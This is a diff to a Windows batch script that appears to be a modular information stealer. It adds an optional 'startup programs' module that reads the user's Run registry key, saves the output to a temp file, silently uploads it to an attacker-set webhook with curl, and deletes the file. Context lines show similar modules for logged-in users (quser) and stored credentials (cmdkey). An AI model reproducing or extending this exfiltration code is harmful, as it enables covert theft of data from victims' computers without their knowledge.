@@ -92,6 +92,15 @@ goto skipquser
 	del "%quser%" >nul 2>&1
 :skipquser
 
+:: STARTUP PROGRAMS - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
+:: ------------------------------------------------------------------
+goto skipstartupprograms
+	set "stup=%appdata%\stup.txt"
+	2>NUL reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run >> "%stup%"
+	curl --silent --output /dev/null -F tasks=@"%stup%" %webhook%
+	del "%stup%" >nul 2>&1
+:skipstartupprograms
+
 :: CMDKEY - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
 :: ------------------------------------------------------------------
 goto skipcmdkey
